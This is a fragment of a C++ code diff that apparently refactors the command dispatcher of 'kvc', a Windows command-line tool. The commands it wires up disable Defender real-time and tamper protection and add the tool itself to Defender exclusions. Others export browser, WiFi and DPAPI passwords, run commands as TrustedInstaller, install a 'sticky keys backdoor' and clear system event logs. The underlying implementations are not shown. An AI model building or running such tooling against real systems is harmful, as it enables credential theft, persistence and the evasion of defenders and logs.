+            else { ERROR(L"Unknown action: %s", act.c_str()); INFO(L"Usage: kvc rtp <on|off|status>"); }
+            wda.closeSecurityWindow();
+            return res ? 0 : 1;
+        }},
+        {L"tp", [](int argc, wchar_t** argv) {
+            if (argc < 3) { INFO(L"Usage: kvc tp <on|off|status>"); return 1; }
+            WindowsDefenderAutomation wda;
+            if (!wda.openDefenderSettings()) { ERROR(L"Failed to open Windows Security"); return 1; }
+            std::wstring act = argv[2];
+            bool res = false;
+            if (act == L"on") { res = wda.enableTamperProtection(); if(res) SUCCESS(L"Tamper Protection enabled successfully"); else ERROR(L"Failed to enable Tamper Protection"); }
+            else if (act == L"off") { res = wda.disableTamperProtection(); if(res) SUCCESS(L"Tamper Protection disabled successfully"); else ERROR(L"Failed to disable Tamper Protection"); }
+            else if (act == L"status") { wda.getTamperProtectionStatus(); res = true; }
+            else { ERROR(L"Unknown action: %s", act.c_str()); INFO(L"Usage: kvc tp <on|off|status>"); }
+            wda.closeSecurityWindow();
+            return res ? 0 : 1;
+        }},
 
-		else if (command == L"watermark" || command == L"wm") {
-			if (argc < 3) {
-				ERROR(L"Missing subcommand. Usage: kvc watermark <remove|restore|status>");
-				return 1;
-			}
-			
-			std::wstring_view subCommand = argv[2];
-			
-			if (subCommand == L"remove") {
-				INFO(L"Removing Windows desktop watermark...");
-				return g_controller->RemoveWatermark() ? 0 : 2;
-			}
-			else if (subCommand == L"restore") {
-				INFO(L"Restoring Windows desktop watermark...");
-				return g_controller->RestoreWatermark() ? 0 : 2;
-			}
-			else if (subCommand == L"status") {
-				std::wstring status = g_controller->GetWatermarkStatus();
-				INFO(L"Watermark status: %s", status.c_str());
-				return 0;
-			}
-			else {
-				ERROR(L"Unknown watermark subcommand: %s", subCommand.data());
-				return 1;
-			}
-		}
-		
-        // ====================================================================
-        // UNKNOWN COMMAND
-        // ====================================================================
-        
-        else {
+        // --- Exclusions ---
+        {L"add-exclusion", [](int argc, wchar_t** argv) {
+            if (argc < 3) { // Legacy: add self
+                wchar_t p[MAX_PATH]; if(GetModuleFileNameW(nullptr, p, MAX_PATH)==0){ ERROR(L"Failed to get current executable path"); return 1; }
+                INFO(L"Adding self to Defender exclusions: %s", p);
+                return g_controller->AddToDefenderExclusions(p) ? 0 : 2;
+            }
+            std::wstring sub = StringUtils::ToLowerCaseCopy(argv[2]);
+            if (argc < 4) return g_controller->AddToDefenderExclusions(argv[2]) ? 0 : 2; // Legacy
+            if (sub == L"paths" || sub == L"path") return g_controller->AddPathExclusion(argv[3]) ? 0 : 2;
+            if (sub == L"processes" || sub == L"process") return g_controller->AddProcessExclusion(argv[3]) ? 0 : 2;
+            if (sub == L"extensions" || sub == L"extension") return g_controller->AddExtensionExclusion(argv[3]) ? 0 : 2;
+            if (sub == L"ipaddresses" || sub == L"ip") return g_controller->AddIpAddressExclusion(argv[3]) ? 0 : 2;
+            // Fallback for legacy
+            return g_controller->AddToDefenderExclusions(argv[2]) ? 0 : 2;
+        }},
+        {L"remove-exclusion", [](int argc, wchar_t** argv) {
+            if (argc < 3) { wchar_t p[MAX_PATH]; if(GetModuleFileNameW(nullptr, p, MAX_PATH)==0){ ERROR(L"Failed to get current executable path"); return 1; } INFO(L"Removing self from Defender exclusions: %s", p); return g_controller->RemoveFromDefenderExclusions(p) ? 0 : 2; }
+            std::wstring sub = StringUtils::ToLowerCaseCopy(argv[2]);
+            if (argc < 4) return g_controller->RemoveFromDefenderExclusions(argv[2]) ? 0 : 2; // Legacy
+            if (sub == L"paths" || sub == L"path") return g_controller->RemovePathExclusion(argv[3]) ? 0 : 2;
+            if (sub == L"processes" || sub == L"process") return g_controller->RemoveProcessExclusion(argv[3]) ? 0 : 2;
+            if (sub == L"extensions" || sub == L"extension") return g_controller->RemoveExtensionExclusion(argv[3]) ? 0 : 2;
+            if (sub == L"ipaddresses" || sub == L"ip") return g_controller->RemoveIpAddressExclusion(argv[3]) ? 0 : 2;
+            return g_controller->RemoveFromDefenderExclusions(argv[2]) ? 0 : 2;
+        }},
+
+        // --- Passwords ---
+        {L"browser-passwords", HandleBrowserPasswords},
+        {L"bp",                HandleBrowserPasswords},
+        {L"export", [](int argc, wchar_t** argv) {
+            if (argc < 3) { ERROR(L"Missing export subcommand: secrets"); return 1; }
+            if (std::wstring(argv[2]) == L"secrets") {
+                std::wstring path = (argc >= 4) ? argv[3] : PathUtils::GetDefaultSecretsOutputPath();
+                if (path.empty()) { ERROR(L"Failed to determine default output path"); return 1; }
+                if (CheckKvcPassExists()) {
+                    INFO(L"Extracting browser passwords via COM elevation...");
+                    if (!g_controller->ExportBrowserData(path, L"edge")) INFO(L"Edge COM extraction failed");
+                    if (!g_controller->ExportBrowserData(path, L"chrome")) INFO(L"Chrome extraction failed");
+                } else {
+                    ERROR(L"kvc_pass.exe not found - Chrome extraction unavailable");
+                    INFO(L"Edge will fallback to DPAPI (no JSON output)");
+                }
+                INFO(L"Extracting WiFi and generating DPAPI reports...");
+                g_controller->ShowPasswords(path);
+                return 0;
+            }
+            ERROR(L"Unknown export subcommand: %s", argv[2]); return 1;
+        }},
+
+        // --- System & Registry ---
+        {L"trusted", [](int argc, wchar_t** argv) {
+            if (argc < 3) { ERROR(L"Missing command for elevated execution"); return 1; }
+            std::wstring cmd;
+            for (int i = 2; i < argc; i++) { if (i > 2) cmd += L" "; cmd += argv[i]; }
+            return g_controller->RunAsTrustedInstaller(cmd) ? 0 : 2;
+        }},
+        {L"install-context", [](int, wchar_t**) { return g_controller->AddContextMenuEntries() ? 0 : 1; }},
+        {L"shift",   [](int, wchar_t**) { INFO(L"Installing sticky keys backdoor..."); return g_controller->InstallStickyKeysBackdoor() ? 0 : 2; }},
+        {L"unshift", [](int, wchar_t**) { INFO(L"Removing sticky keys backdoor..."); return g_controller->RemoveStickyKeysBackdoor() ? 0 : 2; }},
+        {L"registry", [](int argc, wchar_t** argv) {
+            if (argc < 3) { ERROR(L"Missing registry subcommand: backup, restore, defrag"); return 1; }
+            std::wstring sub = argv[2];
+            HiveManager hm;
+            if (sub == L"backup") return hm.Backup((argc >= 4) ? argv[3] : L"") ? 0 : 2;
+            if (sub == L"restore") { if(argc<4){ERROR(L"Missing source path for restore"); return 1;} return hm.Restore(argv[3]) ? 0 : 2; }
+            if (sub == L"defrag") return hm.Defrag((argc >= 4) ? argv[3] : L"") ? 0 : 2;
+            ERROR(L"Unknown registry subcommand: %s", sub.c_str()); return 1;
+        }},
+
+        // --- Misc ---
+        {L"watermark", [](int argc, wchar_t** argv) {
+            if (argc < 3) { ERROR(L"Missing subcommand. Usage: kvc watermark <remove|restore|status>"); return 1; }
+            std::wstring sub = argv[2];
+            if (sub == L"remove") { INFO(L"Removing Windows desktop watermark..."); return g_controller->RemoveWatermark() ? 0 : 2; }
+            if (sub == L"restore") { INFO(L"Restoring Windows desktop watermark..."); return g_controller->RestoreWatermark() ? 0 : 2; }
+            if (sub == L"status") { std::wstring s=g_controller->GetWatermarkStatus(); INFO(L"Watermark status: %s", s.c_str()); return 0; }
+            ERROR(L"Unknown watermark subcommand: %s", sub.c_str()); return 1;
+        }},
+        {L"wm", [](int argc, wchar_t** argv) { return commandMap.at(L"watermark")(argc, argv); }},
+        {L"setup", [](int, wchar_t**) { INFO(L"Loading and processing kvc.dat combined binary..."); return g_controller->LoadAndSplitCombinedBinaries() ? 0 : 2; }},
+        {L"evtclear", [](int, wchar_t**) { return g_controller->ClearSystemEventLogs() ? 0 : 2; }}
+    };
+
+    // ========================================================================
+    // EXECUTION
+    // ========================================================================
+
+    try {
+        auto it = commandMap.find(command);
+        if (it != commandMap.end()) {
+            int result = it->second(argc, argv);
+            CleanupDriver();
+            return result;
+        } else {
             HelpSystem::PrintUnknownCommandMessage(command);
+            CleanupDriver();
             return 1;
         }
     }
     catch (const std::exception& e) {
-        std::string msg = e.what();
-        std::wstring wmsg(msg.begin(), msg.end());
-        ERROR(L"Exception: %s", wmsg.c_str());
+        ERROR(L"Exception: %S", e.what());
         CleanupDriver();
         return 3;
     }
@@ -1432,7 +739,4 @@ int wmain(int argc, wchar_t* argv[])
         CleanupDriver();
         return 3;
     }
-
-    CleanupDriver();
-    return 0;
 }
